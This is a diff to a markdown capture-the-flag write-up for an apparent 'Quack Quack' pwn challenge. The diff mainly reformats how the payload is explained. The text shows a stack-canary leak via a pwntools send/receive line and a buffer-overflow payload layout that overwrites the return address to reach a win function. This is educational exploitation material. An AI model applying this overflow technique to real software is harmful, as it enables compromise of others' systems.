@@ -118,7 +118,8 @@ And then `\x00` is overrided which is the last byte of canary.
   printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
 ```
 Thus, `v1+32=121` and  v1 is the first letter that is found from input. 
-So we need to send `89*'A' + "Quack Quack "(12 bytes) = total 101 bytes = 0x65`
+So we need to send:
+`89*'A' + "Quack Quack "(12 bytes) = total 101 bytes = 0x65`
 ```python
 r.sendlineafter('> ', b'A'* (0x65 - len('Quack Quack ')) + b'Quack Quack ')
 
@@ -129,8 +130,9 @@ canary = u64(r.recv(7).rjust(8, b'\x00'))
 
 After have Canary value, we calculate the distance between the second input and the canary as the previous one.
 `0x60-0x8= 88 bytes`. This time we dont need to plus 1 byte because we have the canary value.
-So the payload is `88*'A' + Canary + 8 bytes (save rbp) + return address(duck_attack)`.
-
+So the payload is:
+`88*'A' + Canary + 8 bytes (save rbp) + return address(duck_attack)`.
+In my code, i write `canary*2`. because one for canary, one for override the 8 bytes save rbp.
 
 # Result
 ![image](https://github.com/user-attachments/assets/60d16b42-810e-4b92-acc2-8eedfdfa18f2)
